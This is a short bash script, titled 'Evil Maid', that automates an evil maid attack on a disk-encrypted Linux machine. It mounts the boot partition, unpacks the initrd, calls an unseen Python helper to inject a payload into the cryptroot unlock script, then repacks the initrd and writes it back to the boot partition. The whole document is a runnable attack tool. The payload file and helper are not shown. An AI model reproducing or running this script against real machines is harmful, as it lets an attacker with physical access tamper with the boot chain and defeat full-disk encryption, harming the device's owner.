#!/bin/bash
#ASCII 
sudo apt install figlet -y -q3
#Print ASCII title
figlet -t -k -f /usr/share/figlet/small.flf "Evil Maid"
#We need to store the path with our python script and payload
wdir=$(pwd)
#Install utility to use lsinitrd 
sudo apt install dracut-core -y -q3
mkdir ~/target
#We mount the boot
sudo mount -t ext4 /dev/sda1 ~/target
#Get filename of initrd, it changes based on OS version
initrd=$(ls ~/target | grep initrd.img)
mkdir ~/out
cd ~/out
#Unpack initrd
lsinitrd --unpack ~/target/$initrd
#Access the the cryptroot location
cd scripts/local-top
#Script to inject our payload
python3 $wdir/edit.py cryptroot $wdir/payload.txt
cd ~/out
#Pack initrd again
find . | cpio -H newc -o | gzip -9 > ~/$initrd
sudo mv ~/$initrd ~/target/$initrd
#Umount boot
sudo umount ~/target
echo "Evil Maid Attack Completed"
exit 0
